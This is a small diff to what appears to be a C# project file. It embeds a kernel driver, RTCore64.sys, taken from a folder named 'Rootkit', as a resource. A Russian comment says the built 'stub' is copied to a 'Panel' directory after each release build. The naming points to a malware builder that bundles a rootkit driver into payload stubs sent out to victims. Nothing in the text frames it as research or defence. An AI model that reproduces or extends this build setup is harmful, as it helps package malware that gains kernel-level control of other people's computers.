@@ -49,6 +49,9 @@
     <EmbeddedResource Include="config.json">
       <LogicalName>config.json</LogicalName>
     </EmbeddedResource>
+    <EmbeddedResource Include="..\Rootkit\RTCore64.sys">
+      <LogicalName>RTCore64.sys</LogicalName>
+    </EmbeddedResource>
   </ItemGroup>
 
   <!-- После каждого Release-билда копируем стаб в Panel/stub/ -->
